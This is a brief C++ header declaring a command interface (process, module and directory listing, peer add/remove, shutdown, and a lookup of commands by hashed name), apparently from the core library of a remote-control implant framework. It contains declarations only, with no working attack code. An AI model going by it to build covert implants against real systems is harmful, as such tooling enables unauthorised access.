#ifndef HEXANE_CORELIB_COMMANDS_HPP
#define HEXANE_CORELIB_COMMANDS_HPP
#include <core/corelib.hpp>
#include <core/dotnet.hpp>

namespace Commands {
    VOID ProcessList();
    VOID DirectoryList(PARSER *parser);
    VOID ProcessModules(PARSER *parser);
    VOID CommandAddPeer(PARSER *parser);
    VOID CommandRemovePeer(PARSER *parser);
    VOID Shutdown(PARSER *parser);
    UINT_PTR FindCommandAddress(UINT32 name);
}

#endif //HEXANE_CORELIB_COMMANDS_HPP
